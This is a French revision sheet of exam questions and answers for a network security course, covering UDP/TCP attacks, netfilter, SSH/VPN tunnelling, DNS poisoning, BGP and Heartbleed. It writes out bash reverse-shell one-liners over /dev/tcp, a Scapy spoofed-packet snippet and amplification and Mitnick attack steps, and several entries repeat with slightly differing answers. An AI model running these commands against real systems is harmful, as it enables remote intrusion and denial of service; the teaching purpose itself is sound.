Réponse : Non. L'application peut utiliser UDP et implémenter elle-même le réordonnancement en ajoutant des numéros de séquence dans les données applicatives. C'est ce que font certains protocoles comme QUIC ou les jeux vidéo en temps réel qui veulent le contrôle fin sur la retransmission.
N5.3Pourquoi UDP est-il plus adapté aux applications temps réel que TCP ?
Réponse : TCP retransmet les paquets perdus et impose un ordre strict → latence quand un paquet est perdu (head-of-line blocking). Pour le streaming vidéo/audio, il est préférable de perdre un paquet que d'attendre sa retransmission. UDP n'a pas de contrôle de congestion ni de retransmission → délai minimal.
N5.4Que signifie l'adresse 0.0.0.0 dans udp.bind(("0.0.0.0", 9090)) ?
Réponse : 0.0.0.0 = écouter sur toutes les interfaces réseau de la machine. Le serveur acceptera les paquets venant de n'importe quelle interface (LAN, Internet, loopback). Si on met 127.0.0.1, on écoute uniquement les connexions locales.
N5.5Pourquoi met-on le checksum UDP à zéro lors du spoofing avec Scapy ?
Réponse : Le checksum UDP est calculé sur un pseudo-header incluant les IPs source/destination. Quand on spoofe l'IP source, le checksum original est invalide. En le mettant à 0, le récepteur le considère comme optionnel (en IPv4, le checksum UDP est optionnel — 0 signifie « pas de vérification »).
N5.6Similarités entre l'attaque Fraggle et l'attaque Smurf ?
Réponse : Les deux sont des attaques par amplification qui utilisent le broadcast :
• Smurf : envoie un ICMP Echo Request vers l'adresse broadcast avec IP source = victime
• Fraggle : même principe mais avec UDP (port 7 echo ou port 19 chargen) au lieu d'ICMP
Les deux résultent en une amplification : toutes les machines du réseau répondent à la victime.
N5.7Programme echo UDP : Alice (10.8.0.8:8000) et Bob (192.168.0.7:7000). (1) Déclencher un ping-pong ? (2) Comment corriger ?
Réponse :
(1) Envoyer un seul paquet UDP spoofé : src=10.8.0.8:8000, dst=192.168.0.7:7000. Bob reçoit, répond à Alice, Alice reçoit, répond à Bob → boucle infinie de paquets UDP.

pkt = IP(src="10.8.0.8", dst="192.168.0.7") / UDP(sport=8000, dport=7000) / "trigger"
send(pkt)
(2) Correction : ajouter un compteur ou TTL applicatif dans le message, vérifier l'IP source avant de répondre, ou rate-limiter les réponses.
N5.8Quels services sont de bons candidats pour l'attaque d'amplification UDP ?
Réponse : Les services qui répondent avec une charge beaucoup plus grande que la requête :
• DNS : requête ~60 octets → réponse +500 octets (facteur ×10-50)
• NTP : commande monlist → réponse de plusieurs Ko
• Memcached : facteur d'amplification jusqu'à ×50000
• SSDP (Simple Service Discovery Protocol, UPnP)
Le principe : envoyer une petite requête avec IP source spoofée = victime → le serveur envoie une grosse réponse à la victime.
T1.1Décrire l'attaque SYN Flood et sa contre-mesure principale
Réponse : SYN Flood : envoyer des milliers de SYN avec IPs spoofées → le serveur alloue des demi-connexions (file backlog) → plus de place pour les vrais clients.
Contre-mesure : SYN Cookies — le serveur encode l'état dans le numéro seq du SYN-ACK → pas d'allocation mémoire avant le 3e ACK.

T1.2Pour une attaque RST : quel champ est critique à deviner ?
Réponse : Le numéro de séquence (seq). Il doit être dans la fenêtre de réception du destinataire. On l'obtient en sniffant avec Wireshark.
T1.3Session Hijacking : pourquoi faut-il seq ET ack corrects ?
Réponse : seq = prochain numéro que l'OS côté serveur attend de ce client. ack = le prochain byte attendu du serveur. Si l'un est faux → TCP RESET ou paquet ignoré.
T1.4Pourquoi l'attaque RST nécessite d'être sur le même LAN ?
Réponse : Pour sniffer les numéros seq/ack en temps réel. Depuis un réseau distant, sans IDS/sniff, il faudrait deviner le seq parmi 2³² valeurs (impossible en pratique).

Réponse : /bin/bash -i > /dev/tcp/IP/9090 0<&1 2>&1
• -i : shell interactif
• > /dev/tcp/IP/9090 : stdout → TCP connection

⚡ N6 — TCP Attacks (N6.1 → N6.23)

N6.1TCP client sans bind : (1) comment reçoit-il les réponses ? (2) quelle ligne déclenche le 3-way handshake ? (3) deux sendall() = deux paquets ?
  • (1) L'OS assigne automatiquement un port éphémère au moment du connect(). Le serveur répond sur ce port.
  • (2) tcp.connect(('10.0.2.69', 9090)) déclenche le SYN/SYN-ACK/ACK
  • (3) Pas nécessairement — TCP est un flux. L'OS peut battre (coalesce) les deux messages en un seul paquet si la fenêtre le permet.
N6.2Serveur TCP : (1) listen() bloque ? (2) rôle de accept() ? (3) pourquoi accept() crée un nouveau socket ?
  • (1) listen() ne bloque pas — elle prépare la queue. C'est accept() qui bloque.
  • (2) accept() attend qu'une connexion soit établie et retourne un nouveau socket connecté + l'adresse du client.
  • (3) Le socket d'écoute doit rester disponible pour d'autres connexions. Chaque accept() crée un socket dédié à cette connexion unique.
N6.3TCP vs UDP : deux clients A envoient vers server B:8023 — données mélangées ?
TCP : Non mélangés — chaque connexion TCP a un socket séparé identifié par (src IP, src port, dst IP, dst port). Le serveur accept() deux fois et obtient deux sockets distincts.
UDP : Potentiellement mélangés — un seul socket reçoit tout. L'OS ne distingue que par l'adresse de l'expéditeur, mais les données arrivent dans le même buffer.
N6.4Frontières entre messages : UDP vs TCP
UDP : Chaque envoi = un datagramme distinct → frontières naturelles (1 recv() = 1 message)
TCP : Flux d'octets — pas de frontières naturelles. Le serveur doit implémenter son propre protocole (longueur préfixée, délimiteur, etc.)
N6.5SYN flood gèle-t-il le serveur ?
Non — le serveur continue de fonctionner pour les connexions établies. Seules les nouvelles connexions sont bloquées (la queue half-open est pleine). Les connexions existantes ne sont pas affectées.
N6.6SYN flood : pourquoi randomiser l'IP source ?
Si on utilise une seule IP, le serveur envoie des SYN-ACK vers cette IP. Si la machine existe et répond avec RST, elle purge les entrées half-open du serveur → attaque inefficace. Les IPs aléatoires évitent les RST et aussi rendent plus difficile le filtrage.
N6.7Si l'IP source spoofée existe et tourne — que se passe-t-il ?
La machine avec cette IP reçoit des SYN-ACK inattendus → elle envoie des RST au serveur → le serveur purge les connexions half-open → attaque moins efficace (mais la machine innocente subit une charge réseau).
N6.8SYN flood sur port 23 — peut-on encore utiliser le port 8023 ?
Oui — chaque port a sa propre queue half-open (backlog). Le flood sur port 23 n'affecte pas la queue du port 8023.
N6.12SYN cookies : "pas besoin de buffer pour half-open" — est-ce correct ?
Oui — c'est exactement le principe des SYN cookies. L'ISN du SYN-ACK encode les infos de connexion (hash). Quand le client répond avec l'ACK, le serveur reconstitue les infos. → Pas de buffer = pas de DoS.
N6.13RST attack sur machines distantes — principaux défis ?
  • Ne peut pas sniffer → ne connaît pas le numéro de séquence exact
  • Doit deviner le seq number (dans la fenêtre de réception) → doit parfois envoyer de nombreux RST avec des seq différents
  • Port source doit être correct (souvent connu depuis l'extérieur ou devinable)
N6.14RST attack efficace contre SSH (connexions chiffrées) ?
Oui — le RST agit au niveau TCP (L4), indépendant du chiffrement SSL/TLS/SSH. La connexion TCP est coupée même si le contenu est chiffré. Par contre, AUCUNE injection de données n'est possible (le contenu injecté serait chiffré différemment).
N6.15UDP est-il sujet aux reset attacks ?
Non — UDP n'a pas de connexion ni de mécanisme de reset. Mais UDP est sujet aux ICMP "Port Unreachable" qui peuvent informer l'application que le serveur est inaccessible.

Échec — le serveur ignore les paquets dont le seq n'est pas dans la fenêtre attendue. Le paquet avec seq=X+100 est hors fenêtre si la fenêtre commence à X.

N6.20Mitnick Attack — B trust A (A down). Comment Mitnick forge une connexion TCP de A vers B ?
  1. Étudier les ISN de B en envoyant de vrais SYN/RST de sa machine → les ISN s'incrémentent de manière prévisible (+128000)
  2. Envoyer SYN forgé avec src=A vers B
  3. B répond avec SYN-ACK vers A (qui est down → pas de RST)
  4. Deviner l'ISN de B et envoyer ACK forgé avec src=A, ack=ISN_prédit+1
  5. Connexion établie (B croit parler à A) → injecter commande rsh/rlogin
N6.21Pourquoi TCP ne peut pas être utilisé pour des attaques d'amplification ?
TCP nécessite un handshake 3-way. Pour déclencher une réponse, l'attaquant doit compléter le handshake (avec SYN+ACK reçu). Avec IP spoofé, il ne peut pas recevoir le SYN-ACK → pas de connexion complète → pas d'amplification possible.
UDP est stateless → une seule requête génère une réponse potentiellement grande.

📦 N5 — UDP Transport (N5.1 → N5.8)

N5.1Pourquoi les ports 0-1023 sont-ils protégés ?
Ces ports sont les Well-Known Ports (HTTP=80, SSH=22, DNS=53...). Les réserver aux applications root empêche un utilisateur non-privilégié d'intercepter du trafic critique ou d'usurper un service standard en écoutant sur ces ports.
N5.2Application nécessitant ordre de paquets — doit-elle utiliser TCP ?
Non — une application peut utiliser UDP et implémenter elle-même le mécanisme d'ordonnancement (numérotation des messages + buffer de réassemblage). Exemple : QUIC, certains jeux vidéo en ligne.
N5.3Pourquoi UDP est-il plus adapté aux applications temps-réel ?
  • Pas de retransmission automatique → pas de délai additionnel si paquet perdu
  • Pas de contrôle de congestion → débit constant
  • Pas d'overhead du handshake TCP
  • Pour voix/vidéo, un paquet perdu est préférable à un paquet retardé
N5.5Pourquoi mettre le checksum UDP à 0 lors du spoofing avec Scapy ?
Le checksum UDP inclut le pseudo-header IP (src IP, dst IP, len, proto). Lors du spoofing, l'IP source est falsifiée → le checksum serait incorrect. Mettre à 0 indique que le checksum est désactivé (légalement autorisé pour UDP) → le récepteur l'accepte sans vérification.
N5.6Similitudes entre Fraggle et Smurf attack ?
Les deux utilisent l'amplification par broadcast : l'attaquant envoie un paquet à l'adresse broadcast d'un réseau avec IP src = la victime. Tous les hôtes du réseau répondent à la victime → amplification.

N5.8Quels services sont de bons candidats à l'amplification UDP ?
Services avec un ratio réponse/requête élevé et stati-less (pas de connexion) :
  • DNS (facteur ×28-54)
  • NTP (facteur ×556 avec monlist)
  • SSDP (protocole UPnP)
  • Memcached (facteur ×50000)
  • SNMP (facteur ×6.6)

Réponse : Pour un paquet généré localement : NF_INET_LOCAL_OUT → NF_INET_POST_ROUTING. Donc F2 (priority -120), puis F3 (priority -100), puis F4 n'est pas invoqué (FORWARD = pour les paquets routés, pas générés localement).
N7.13Avantages des firewalls stateful ?
Réponse : Permettent des règles basées sur l'état de connexion (ESTABLISHED, NEW...) → plus précis. Ex : autoriser les réponses aux connexions initiées de l'intérieur sans autoriser les connexions inbound. Impossible avec un firewall stateless.

N7.18ICMP et UDP n'ont pas de connexions — comment conntrack les suit-il ?
Réponse : Pour ICMP : une "connexion" = un exchange Echo Request/Reply (même id). Pour UDP : une "connexion" = paquets entre même paire src/dst IP+port dans un délai. Ces états ont un TTL court (30s pour UDP, quelques secondes pour ICMP).
N8.7Noms possibles de l'interface TUN créée avec b'abc%d' ?
Réponse : abc0, abc1, abc2… Le kernel assigne le premier index disponible avec le pattern abc%d.
N8.8Faut-il augmenter le buffer de lecture au-delà de 2048 ?
Réponse : Non. Le MTU de tun0 = 1500 octets. Un paquet IP ne peut pas dépasser 1500 octets sur cette interface. 2048 est suffisant.
N8.9Premier byte lu depuis tun0 — lequel parmi 0x12, 0x23, 0x34, 0x45 ?
Réponse : (D) 0x45 = première byte de l'en-tête IP : version=4 (nibble haut) + IHL=5 (nibble bas).
N8.11Pourquoi activer ip_forward sur le serveur VPN ?
Réponse : Le serveur VPN reçoit des paquets (depuis tun0) destinés à d'autres réseaux → il doit les router/forwarder. Sans ip_forward=1, le kernel les rejette car il n'est pas leur destination finale.
N8.15Comment TAP reçoit-il des paquets (vs TUN) ?
Réponse : TUN reçoit des paquets via le routage (table de routage). TAP reçoit des trames Ethernet complètes via un mécanisme de bridging (pont réseau) — le kernel bridge envoie les trames vers le TAP.
N8.1Différences principales entre SSH tunnel et VPN tunnel ?
Réponse : SSH tunnel : redirige un port/application spécifique, fonctionne au niveau application (L7), la configuration est par application. VPN tunnel : TUN interface L3, tout le trafic IP est tunnelisé automatiquement, transparent pour toutes les applications.

N9.1VPN SSH vers H (10.7.2.0/24, seul SSH autorisé) — configuration nécessaire ?
Réponse :
Sur la machine externe :
1. ssh -w 0:0 root@H pour créer tun0 des deux côtés
2. ip addr add 10.53.0.1/24 dev tun0 && ip link set tun0 up
3. ip route add 10.7.2.0/24 dev tun0 (router vers réseau interne)
Sur H :

3. Ajouter route pour retour : ip route add 10.53.0.1 dev tun0
N9.2Pourquoi VPN bypass les geo-restrictions ?
Réponse : Le firewall/service vérif l'IP source des paquets. Avec VPN, les paquets arrivent depuis l'IP du serveur VPN (qui est dans la zone autorisée), pas depuis votre vraie IP. Le service croit que vous êtes dans cette région.
N9.3Alice sur Terre veux accéder à sirius:9090 (bloqué). Elle a un compte sur Mars. Comment via SSH tunnel ?
Réponse :
(1) Créer le tunnel :
ssh -4NT -L 0.0.0.0:9090:sirius:9090 alien@mars
Cela crée un port forwarding : localhost:9090 (Terre) → mars → sirius:9090
(2) Commande à utiliser sur Terre :
nc localhost 9090 (au lieu de nc sirius 9090)
N9.4Flux de paquets TCP de earth:nc → sirius:nc via tunnel SSH mars
Réponse :
1. nc (earth) → TCP localhost:9090
2. SSH client lit depuis localhost:9090 → encapsule dans SSH stream → TCP vers mars:22
3. SSH server (mars) décapsule → forwarde vers sirius:9090 via TCP
4. sirius:nc reçoit la donnée
→ 3 connexions TCP : earth→mars (SSH), mars→sirius (nc), et la "virtuelle" earth→sirius
N9.5Alice veut accéder à plusieurs sites hors Solar System — éviter un tunnel par site ?
Réponse : Utiliser Dynamic Port Forwarding (SOCKS5) :
ssh -4NT -D 0.0.0.0:1080 alien@mars
Configurer Firefox/curl pour utiliser SOCKS5 proxy localhost:1080. Mars forward dynamiquement vers le bon site selon les requêtes SOCKS5.
N9.6Amis d'Alice veulent visiter son web server sur Terre (bloqué par firewall) — Remote Port Forwarding ?
Réponse : Remote Port Forwarding :
Sur earth : ssh -4NT -R mars_ip:8080:localhost:80 alien@mars
Cela ouvre le port 8080 sur mars, qui forward vers earth:80.
Les amis font : curl http://mars:8080 → atteint alice sur earth.

N7.1Qu'est-ce que netfilter ? Avantages ?
Netfilter est un framework du kernel Linux permettant d'intercepter et modifier les paquets réseau via des hooks. Avantages : filtrage puissant, NAT, logging, connection tracking — tout dans le kernel.
N7.25 hooks netfilter IPv4 et leurs rôles ?
HookMoment
NF_INET_PRE_ROUTINGÀ l'arrivée du paquet (avant routing)

  2. PRE_ROUTING → FORWARD → POST_ROUTING
  3. LOCAL_OUT → POST_ROUTING
N7.6Quel hook est le meilleur pour : (1) restreindre INPUT, (2) restreindre OUTPUT ?
  • (1) NF_INET_LOCAL_IN (filter INPUT chain) — paquet déjà routé vers cette machine
  • (2) NF_INET_LOCAL_OUT (filter OUTPUT chain) — paquet avant envoi
N7.8F1@POST_ROUTING(-110), F2@LOCAL_OUT(-120), F3@LOCAL_OUT(-100), F4@FORWARD(-110) — ordre pour un ICMP echo ?
Pour un paquet créé localement (ICMP echo) : LOCAL_OUT → POST_ROUTING. Fonctions invoquées : F2 (LOCAL_OUT, priorité -120, plus bas = premier), puis F3 (LOCAL_OUT, -100), puis F1 (POST_ROUTING, -110). F4 (FORWARD) n'est pas invoqué.
N7.9Si un hook retourne NF_ACCEPT, le paquet est accepté — vrai ou faux ?
Faux — NF_ACCEPT signifie "passer au prochain hook/fonction". Si une autre fonction dans la chaîne retourne NF_DROP, le paquet est quand même rejeté.
N7.10F1→F2→F3 sur un hook. F2 retourne NF_ACCEPT : F3 invoquée ? F2 retourne NF_DROP : F3 invoquée ?
  • F2 retourne NF_ACCEPT → ✅ F3 est invoquée (NF_ACCEPT = passer au suivant)
  • F2 retourne NF_DROP → ❌ F3 n'est PAS invoquée (paquet immédiatement rejeté)
N7.11iptables chains → hooks netfilter ?
  • filter INPUT → NF_INET_LOCAL_IN
  • nat OUTPUT → NF_INET_LOCAL_OUT
  • mangle POSTROUTING → NF_INET_POST_ROUTING
N7.13Avantages d'un firewall stateful (connection tracking) ?
Permet d'écrire des règles simples comme "accepter les paquets de connexions établies". Exemple : bloquer tout entrant sauf les réponses à nos propres connexions sortantes. Sans stateful, il faudrait permettre tout trafic entrant sur les ports éphémères → dangereux.

Pour UDP : une "connexion" = même src IP/port + dst IP/port. Pour ICMP : même src+dst IP + même ID de message ICMP. Ces pseudo-connexions ont des timers courts.

iptables -t nat -A PREROUTING -p udp --dport 9000 -j DNAT --to-destination D:9000
N7.18ICMP et UDP n'ont pas de connexions — que signifie "connexion" pour conntrack ?
Pour UDP : une "connexion" = même src IP/port + dst IP/port. Pour ICMP : même src+dst IP + même ID de message ICMP. Ces pseudo-connexions ont des timers courts.
N7.19conntrack -L : timeouts restants (tcp=431752, udp=1, icmp=29) ?
  • TCP ESTABLISHED : expire dans 431752 secondes (~5 jours)
  • UDP : expire dans 1 seconde
  • ICMP : expire dans 29 secondes
N9.1Bypass firewall interne via SSH VPN — quelle config ?
Réponse : Sur la machine extérieure et H : créer interface TUN. Sur extérieure : ssh -w 0:0 user@H. Configurer les interfaces TUN des deux côtés + ajouter route vers réseau interne via tun0 sur la machine extérieure.
N9.2Pourquoi le VPN bypass les restrictions géographiques ?
Réponse : Le serveur VPN est dans un autre pays/région. Le trafic arrive au site web avec l'IP du serveur VPN (pas de l'utilisateur). Si le VPN server est dans la région autorisée → accès accordé.
N9.3Comment Alice depuis Earth accède sirius:9090 via SSH tunnel (mars) ?
Réponse : 
# Créer le tunnel SSH
ssh -L 1234:sirius:9090 alien@mars
# Utiliser le tunnel
nc localhost 1234
N9.7Différence entre VPN TUN et SOCKS5 dynamic forwarding ?
Réponse : VPN TUN : L3, transparent, tout le trafic tunnelisé automatiquement. SOCKS5 : L4/L7, chaque application doit être configurée. VPN = plus complet, SOCKS5 = plus léger/flexible.
DNS.1Différence DNS Autoritaire vs Résolveur Récursif ?
Réponse : Autoritaire : possède la zone DNS et répond définitivement. Résolveur récursif : interroge d'autres serveurs pour le compte du client, met en cache les résultats. Le résolveur est "du côté client", l'autoritaire est "du côté serveur".
DNS.2Comment fonctionne l'empoisonnement DNS local ?
Réponse : L'attaquant sniffe les requêtes DNS sortantes du résolveur local → forge une réponse avec le bon ID DNS → si la fausse réponse arrive avant la vraie → le cache DNS est empoisonné pour la durée du TTL.
DNS.3Pourquoi l'attaque Kaminsky est-elle plus difficile ?
Réponse : L'attaquant ne peut pas voir les requêtes DNS (résolveur distant). Il doit deviner l'ID DNS (16 bits = 65536 valeurs). La randomisation du port source ajoute ~15 bits d'entropie → 2³¹ combinaisons → attaque quasi impossible en pratique.
DNS.4Quelle est la principale contre-mesure au DNS poisoning ?
Réponse : DNSSEC : signatures cryptographiques sur les réponses DNS. Même si l'attaquant forge une réponse, sans la clé privée il ne peut pas forger la signature RRSIG valide.
N13.1Quel est le but du protocole Heartbeat TLS ?
Réponse : Garder une connexion TLS active (keep-alive). Le client envoie un message avec un payload, le serveur répond en echo du même payload. Évite de re-négocier TLS fréquemment.
N13.2Quel est le bug Heartbleed ?
Réponse : Le serveur utilise la longueur annoncée dans le message (non vérifiée) pour copier la mémoire → copie jusque 65535 octets depuis le heap, incluant clés privées, mots de passe, cookies, etc.
N12.2Un routeur BGP connaît 10 chemins vers un préfixe — combien annonce-t-il à ses pairs ?
Réponse : Un seul — le meilleur chemin sélectionné. BGP n'annonce qu'un chemin (best path selection) à ses pairs EBGP (sauf si ECMP configuré).
N12.6Pourquoi les paquets EBGP ont TTL=1 par défaut ?
Réponse : Les pairs EBGP sont directement connectés (un saut). TTL=1 garantit que si le paquet dépasse un saut, il est rejeté → sécurité (un routeur compromis distant ne peut pas forger des updates BGP).
N14.6Pour "cat 1>&3" — dup2(1,3) ou dup2(3,1) ?
Réponse : dup2(1, 3) — la syntaxe est dup2(oldfd, newfd). On veut que fd 3 pointe vers le même fichier que fd 1 (stdout).
N14.11Quelles commandes reverse shell fonctionnent ?
Réponse :
  • ✅ 2 : /bin/bash -i >/dev/tcp/IP/9090 0<&1 2>&1
  • ✅ 3 : /bin/bash -i >/dev/tcp/IP/9090 2>&1 0<&1
  • ✅ 4 : /bin/bash -i 2>/dev/tcp/IP/9090 1>&2 0<&2
  • ❌ 1 : 0<&1 2>&0 — stdin vient de stdout qui va dans TCP, mais stderr → stdin (pas TCP)
  • ❌ 5 : stdin vient de fd1 (TCP) mais 0<&1 après 2>&1 — chaîne incorrecte
N12.2Un routeur BGP connait 10 chemins vers un préfixe — combien en annonce-t-il à ses pairs ?
Réponse : Un seul — le meilleur chemin sélectionné par le BGP best path selection algorithm. BGP n'annonce qu'un seul chemin par préfixe (sauf ECMP ou add-path configuré).
N12.3X reçoit un AS path de A et le transmet à B, C, D mais PAS à E — raison possible ?
Réponse : Règle de BGP split horizon ou politique commerciale : si E et A sont dans un accord de peering (ou E est le client/provider de A), X ne re-publie pas ce chemin pour éviter les boucles ou les fuites de routes. Ou : E a une politique "no-export" avec X.
N12.4AS A utilise B comme backup. (1) Éviter d'utiliser A-B par défaut côté sortant. (2) Informer les autres d'éviter le lien A-B côté entrant.
Réponse : (1) Sortant : Configurer un LOCAL_PREF bas pour les routes reçues via B (ex: 50 vs 100 pour autres liens). Les routeurs d'AS A préfèrent les routes avec LOCAL_PREF plus élevé.
(2) Entrant : Utiliser la technique AS Path Prepending : annoncer le préfixe avec l'AS de A répété plusieurs fois (ex: A A A 128.230.0.0/16) → AS path plus long → moins préféré par les autres AS.
N12.5Analyser ce BGP UPDATE : quel AS l'envoie ? que contient-il ? rôle NEXT_HOP ?
Réponse : Le message : Type=2 (UPDATE), retire 10.151.0.0/24, annonce 10.164.0.0/24 via AS path 3→12→164.
(1) Le message annonce un nouveau préfixe et retire un ancien.
(2) L'expéditeur appartient à AS 3 (premier AS dans l'AS_PATH).
(3) NEXT_HOP = 10.100.0.3 : l'IP du prochain routeur directement accessible (voisin BGP direct) vers lequel forwarder les paquets pour 10.164.0.0/24.
N12.6Pourquoi les paquets EBGP ont-ils TTL=1 par défaut ?
Réponse : Les pairs EBGP sont directement connectés (1 seul saut). TTL=1 garantit que le paquet est détruit s'il dépasse un routeur → Sécurité : un attaquant distant ne peut pas forger des BGP UPDATE messages depuis loin.
N12.7Certains routeurs BGP mettent TTL=255 — pourquoi ?
Réponse : Technique GTSM (Generalized TTL Security Mechanism) : le routeur rejette tout paquet BGP reçu avec TTL inférieur à 254. Cela garantit que le pair est à exactement 1 saut (TTL=255 envoyé → 254 reçu). Protège contre les attaques à distance.
N12.9Pourquoi IP anycast n'est-il pas adapté à telnet ?
Réponse : Anycast route vers le nœud le plus proche. En cours de session TCP (telnet), si le routage change (failover), les paquets peuvent aller vers un différent nœud anycast qui ne connaît pas la connexion TCP → connexion rompue. Anycast est adapté aux services stateless (DNS, NTP).
N12.10Attaquant compromet BGP sur Level 3 — veut bloquer Bank32 (130.219.96.0/19). Comment ? Contre-mesure ?
Réponse : (1) Attaquant annonce 130.219.96.0/19 avec un blackhole next-hop, ou annonce avec AS_PATH très long pour le rendre non préférable, ou retire le préfixe (WITHDRAW 130.219.96.0/19) → le préfixe disparaît d'Internet.
(2) La banque peut annencer des sous-préfixes plus spécifiques via d'autres opérateurs : ex. 130.219.96.0/21 + 130.219.104.0/21 (longest prefix match → prioritaire sur /19).
N13.1Quel est le but du protocole Heartbeat TLS ?
Réponse : Keep-alive d'une session TLS sans avoir à re-négocier. Le client envoie un message avec payload + length, le serveur répond en écho (echo back) du même payload. Évite que la connexion TLS expire en cas d'inactivité.
N13.2Quelle est la faute dans Heartbleed ?
Réponse : Le serveur utilise la longueur déclarée dans le message (payload_length) — non vérifiée — pour copier les octets en réponse. Si payload_length = 65535 mais payload réel = 5 octets, le serveur copie 65535 octets depuis la mémoire adjacente (heap) → fuite mémoire (clés privées, cookies, mots de passe).
N13.3Leçon à retenir de Heartbleed ?
Réponse : Toujours valider toutes les entrées avant de les utiliser — en particulier les champs de longueur. Ne jamais faire confiance à des métadonnées non vérifiées. "Never trust user input."
N13.4payload_length = 0x700 = 1792. Mémoire à 0x4000. Quels CC numbers volés ?
Réponse : Le serveur copie 1792 octets à partir de 0x4000 (là où le payload est stocké). 0x4000 + 0x700 = 0x4700. Les adresses mémoire entre 0x4000 et 0x4700 incluent potentiellement Credit Card Number 1 (stocké entre 0x4300 et 0x4500) et possiblement une partie de CC2 (0x4500). CC3 à 0x3500 est en dessous de 0x4000 → non copié.
N13.5Si allocation avec taille réelle mais copie avec taille déclarée ?
Réponse : Heap buffer overflow — l'allocation faite pour la vraie taille est insuffisante, mais la copie écrit payload_length octets → dépasse le buffer alloué → corruption de la mémoire adjacente → potentiellement exploitable pour code execution (mais pas de fuite directe).
N13.6Si allocation avec taille déclarée mais copie avec taille réelle ?
Réponse : Buffer correctement alloué (grand), mais on copie seulement les vrais octets (petits). La réponse contiendra du "garbage" mémoire de la zone non copiée (octets aléatoires du heap au-delà du payload). Information leak de la mémoire non initialisée, mais moins grave qu'Heartbleed (les octets copiés sont au moins legit).

🔀 N14 — Reverse Shell

N14.1Lister /dev/fd dans 2 fenêtres — pourquoi différent ?
Réponse : /dev/fd → symlink vers /proc/self/fd. self → PID du processus courant. Chaque fenêtre a un shell différent avec un PID différent → les FDs ouverts peuvent être différents.
N14.2exec 5>/dev/null — que se passe-t-il ?
Réponse : Le file descriptor 5 du shell courant est ouvert et redirigé vers /dev/null. Tout ce qu'on écrira sur FD5 sera ignoré. exec sans commande applique la redirection au shell lui-même (pas à un sous-processus).
N14.3exec 5>/tmp/xyz puis echo hello >&5 — résultat ?
Réponse : exec 5>/tmp/xyz ouvre le FD5 vers /tmp/xyz. echo hello >&5 redirige stdout de echo vers FD5 → "hello" est écrit dans /tmp/xyz.
N14.4fd = open("/tmp/xyz", O_RDWR) retourne 0 — pourquoi ?
Réponse : Le FD 0 (stdin) a été préalablement fermé. open() retourne toujours le FD disponible le plus petit → 0. Cela signifie que /tmp/xyz est maintenant stdin du processus.
N14.5read(5, data, 100) et write(3, data, 100) — que font-ils ?
Réponse : read(5, data, 100) : lire 100 octets depuis FD5 dans le buffer data. write(3, data, 100) : écrire 100 octets de data vers FD3.
N14.6Pour "cat 1>&3", on appelle dup2(1,3) ou dup2(3,1) ?
Réponse : dup2(1, 3) — la syntaxe est dup2(oldfd, newfd). On veut que FD3 devienne une copie de FD1 (stdout). Donc : dup2(1, 3).
N14.71er printf vers écran, 2ème vers /tmp/xyz. Que faire entre les deux ?
Réponse : 
int fd = open("/tmp/xyz", O_WRONLY|O_CREAT, 0644);
dup2(fd, 1);  // Rediriger stdout vers le fichier
close(fd);    // Fermer le fd original (on a le dup)
N14.8Après dup2(fd1,9), dup2(fd2,fd1), dup2(9,1) — où va printf ?
Réponse :
  • dup2(fd1, 9) : FD9 = copie de fd1 (file1)
  • dup2(fd2, fd1) : fd1 devient copie de fd2 (file2)
  • dup2(9, 1) : FD1 (stdout) = FD9 = file1
→ printf va dans file1 (/tmp/file1)
N14.9/bin/cat < /dev/tcp/10.0.2.6/7070 >&0 — que se passe-t-il ?
Réponse : cat lit son entrée depuis la connexion TCP (10.0.2.6:7070) et écrit sur stdout (&0 = FD0 = stdin ≈ terminal). Tout ce que nc tape sur Machine 1 apparaît sur Machine 2.
N14.10/bin/cat 1>/dev/tcp/10.0.2.6/9090 0 — fonctionne ?
Réponse : Non. Les deux redirections ouvrent deux connexions TCP séparées sur le même port (9090), mais nc n'écoute qu'une connexion → la deuxième échoue. Pour que ça marche, il faudrait réutiliser le même FD : /bin/cat 1>/dev/tcp/IP/9090 0<&1
N14.11Quelles commandes reverse shell fonctionnent ?
Réponse :
CommandeFonctinne ?Explication
1: 0<&1 2>&1✅stdin=stdout(TCP), stderr=stdout
2: 0<&1 2>&1✅Identique à 1
3: 2>&1 0<&1✅stderr=stdout(TCP), stdin=stdout
4: 2>TCP 1>&2 0<&2✅stderr=TCP, stdout=stderr, stdin=stderr
5: 2>TCP 1>&2 0<&1❌stdin=stdout qui pointe terminal (pas TCP)
N14.12Compléter : /bin/bash -i < /dev/tcp/IP/9090 ...
Réponse : /bin/bash -i < /dev/tcp/IP/9090 1>&0 2>&0
stdin déjà redirigé depuis TCP. stdout (1) et stderr (2) doivent aussi aller vers TCP (FD0).
N14.13cat sur Machine 1 : input depuis Machine 2, output vers Machine 3
Réponse :
  • Machine 2 : nc -l 7070 (fournie l'input)
  • Machine 3 : nc -l 8080 (reçoit l'output)
  • Machine 1 : /bin/cat </dev/tcp/M2:7070 1>/dev/tcp/M3:8080
N14.14Quel(s) shell peut lancer un reverse shell via /dev/tcp ?
Réponse :
  • 1: /bin/zsh -c "/bin/zsh -i > /dev/tcp..." → ❌ zsh ne connaît pas /dev/tcp
  • 2: /bin/zsh -c "/bin/bash -i > /dev/tcp..." → ✅ bash gère /dev/tcp même appelé depuis zsh
  • 3: /bin/bash -c "/bin/zsh -i > /dev/tcp..." → ❌ le script est zsh qui ne connaît pas /dev/tcp
  • 4: /bin/bash -c "/bin/bash -i > /dev/tcp..." → ✅ bash connaît /dev/tcp

🌍 N10 — DNS & Attacks (N10.1 → N10.24)

N10.1Utiliser "myhost" au lieu de "localhost" pour sa propre machine ?
Ajouter dans /etc/hosts : 127.0.0.1 myhost
N10.3Protocole et port DNS ?
UDP port 53 pour les requêtes normales. TCP port 53 pour les zones transfers et les réponses > 512 octets (ou avec EDNS0 > MTU).
N10.7Comment le DNS client connaît-il les IPs des root servers ?
Fichier hints pré-installé (/etc/bind/db.root ou named.root) contenant les 13 root servers (A à M). Ce fichier est mis à jour manuellement ou via IANA.
N10.8Quels champs d'une requête DNS contiennent des données aléatoires à inclure dans la réponse ?
  • Transaction ID (16 bits) — doit être identique dans la réponse
  • Port source UDP (16 bits) — la réponse doit aller vers ce port
N10.9-N10.10Qu'est-ce que le DNS cache poisoning ? Pourquoi DNS est vulnérable ?
Cache poisoning = injecter une fausse réponse dans le cache d'un serveur DNS pour rediriger les utilisateurs. DNS est vulnérable car : (1) pas d'authentification du répondant, (2) le Transaction ID = seulement 16 bits (65536 valeurs), (3) avant randomisation du port source → seules 65536 combinaisons ID+port à deviner.
N10.11Défis du Kaminsky attack et solutions ?
